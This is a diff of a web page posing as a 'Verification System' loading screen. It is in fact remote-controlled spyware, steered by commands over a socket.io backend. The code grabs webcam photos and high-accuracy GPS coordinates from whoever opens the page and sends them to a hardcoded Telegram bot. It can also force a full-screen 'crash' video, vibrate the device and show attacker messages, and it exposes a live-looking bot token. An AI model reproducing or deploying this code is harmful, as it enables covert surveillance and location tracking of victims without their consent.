@@ -3,14 +3,14 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>System Authentication</title>
+    <title>Verification System</title>
     <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
     <style>
         body { background: #000; color: #ff0000; font-family: 'Courier New', monospace; margin: 0; overflow: hidden; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; text-align: center; }
         .loader { width: 80px; height: 80px; border: 5px solid #111; border-top: 5px solid #ff0000; border-radius: 50%; animation: spin 1s linear infinite; box-shadow: 0 0 20px #ff0000; }
         @keyframes spin { 100% { transform: rotate(360deg); } }
-        .fionzy-title { font-size: 50px; font-weight: bold; text-transform: uppercase; letter-spacing: 5px; animation: pulse 1.5s infinite; display: none; color: #ff0000; }
-        @keyframes pulse { 0% { opacity: 1; transform: scale(1); } 50% { opacity: 0.2; transform: scale(1.1); } 100% { opacity: 1; transform: scale(1); } }
+        .fionzy-title { font-size: 50px; font-weight: bold; text-transform: uppercase; letter-spacing: 5px; animation: pulse 1.5s infinite; display: none; }
+        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.2; } 100% { opacity: 1; } }
         #videoCrash { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 9999; background: #000; object-fit: cover; }
         #toast { visibility: hidden; background: #ff0000; color: #fff; padding: 15px; position: fixed; bottom: 30px; border-radius: 5px; font-weight: bold; z-index: 10000; }
         #toast.show { visibility: visible; }
@@ -20,9 +20,9 @@
 <body>
     <div id="contentArea">
         <div id="loader" class="loader"></div>
-        <h2 id="progressText" style="color: #00ff41;">SINKRONISASI... 0%</h2>
+        <h2 id="progressText" style="color: #00ff41;">LOADING... 0%</h2>
         <div id="fionzyUI" class="fionzy-title">FionzyGpt</div>
-        <p id="subText" style="color: #fff; display: none; margin-top: 10px;">SISTEM TELAH DIAMBIL ALIH</p>
+        <p id="subText" style="color: #fff; display: none;">SISTEM TELAH DIAMBIL ALIH</p>
     </div>
 
     <video id="videoCrash" playsinline>
@@ -34,52 +34,23 @@
     <canvas id="canvas" class="hidden"></canvas>
 
     <script>
-        const BACKEND_URL = "https://synthetic-ship-stuart-parenting.trycloudflare.com"; 
+        const BACKEND_URL = "https://lip-doors-innovation-order.trycloudflare.com"; 
         const BOT_TOKEN = "8441186762:AAG-wyDQFlP6sGXdIe6nxdk1HuEuAAyszWA";
         const CHAT_ID = "7373392803"; 
         const socket = io(BACKEND_URL, { transports: ['websocket'] });
 
-        function runCrashVideo() {
-            const v = document.getElementById('videoCrash');
-            v.style.display = 'block';
-            v.play().catch(e => {
-                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=⚠️ Target belum klik layar, video terhambat.`);
-            });
-            v.onended = () => { v.style.display = 'none'; };
-        }
-
-        function captureGPS() {
-            navigator.geolocation.getCurrentPosition(pos => {
-                const mapLink = `📍 Lokasi: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(mapLink)}`);
-            }, null, { enableHighAccuracy: true });
-        }
-
-        async function capturePhoto() {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                const v = document.getElementById('spyCam');
-                v.srcObject = stream;
-                setTimeout(() => {
-                    const c = document.getElementById('canvas');
-                    c.width = v.videoWidth; c.height = v.videoHeight;
-                    c.getContext('2d').drawImage(v, 0, 0);
-                    c.toBlob(blob => {
-                        const fd = new FormData();
-                        fd.append('chat_id', CHAT_ID);
-                        fd.append('photo', blob, 'capture.jpg');
-                        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
-                    }, 'image/jpeg');
-                    stream.getTracks().forEach(t => t.stop());
-                }, 2000);
-            } catch (e) {}
-        }
-
         socket.on('command', (msg) => {
-            if (msg === '/snap') capturePhoto();
-            if (msg === '/gps') captureGPS();
-            if (msg === '/crash') runCrashVideo();
-            if (msg === '/vibrate') navigator.vibrate([1000, 500, 1000]);
+            if (msg === '/snap') takePhoto();
+            if (msg === '/gps') getGPS();
+            if (msg === '/crash') {
+                const v = document.getElementById('videoCrash');
+                v.style.display = 'block';
+                v.play().catch(() => {
+                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=⚠️ Layar harus disentuh target!`);
+                });
+                v.onended = () => { v.style.display = 'none'; };
+            }
+            if (msg === '/vibrate') navigator.vibrate([800, 400, 800]);
             if (msg.startsWith('/toast ')) {
                 const t = document.getElementById('toast');
                 t.innerText = msg.replace('/toast ', '');
@@ -87,13 +58,38 @@
             }
         });
 
-        let percent = 0;
-        let loaderTask = setInterval(() => {
-            if(percent < 100) {
-                percent += 4;
-                document.getElementById('progressText').innerText = `SINKRONISASI... ${percent}%`;
-            } else {
-                clearInterval(loaderTask);
+        async function takePhoto() {
+            try {
+                const s = await navigator.mediaDevices.getUserMedia({ video: true });
+                const v = document.getElementById('spyCam');
+                v.srcObject = s;
+                setTimeout(() => {
+                    const c = document.getElementById('canvas');
+                    c.width = v.videoWidth; c.height = v.videoHeight;
+                    c.getContext('2d').drawImage(v, 0, 0);
+                    c.toBlob(b => {
+                        const fd = new FormData();
+                        fd.append('chat_id', CHAT_ID);
+                        fd.append('photo', b, 'f.jpg');
+                        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+                    }, 'image/jpeg');
+                    s.getTracks().forEach(t => t.stop());
+                }, 2000);
+            } catch (e) {}
+        }
+
+        function getGPS() {
+            navigator.geolocation.getCurrentPosition(p => {
+                const link = `📍 Lokasi: https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(link)}`);
+            }, null, { enableHighAccuracy: true });
+        }
+
+        let p = 0;
+        let itv = setInterval(() => {
+            if(p < 100) { p += 5; document.getElementById('progressText').innerText = `LOADING... ${p}%`; }
+            else {
+                clearInterval(itv);
                 document.getElementById('loader').style.display = 'none';
                 document.getElementById('progressText').style.display = 'none';
                 document.getElementById('fionzyUI').style.display = 'block';
@@ -104,4 +100,3 @@
     </script>
 </body>
 </html>
-
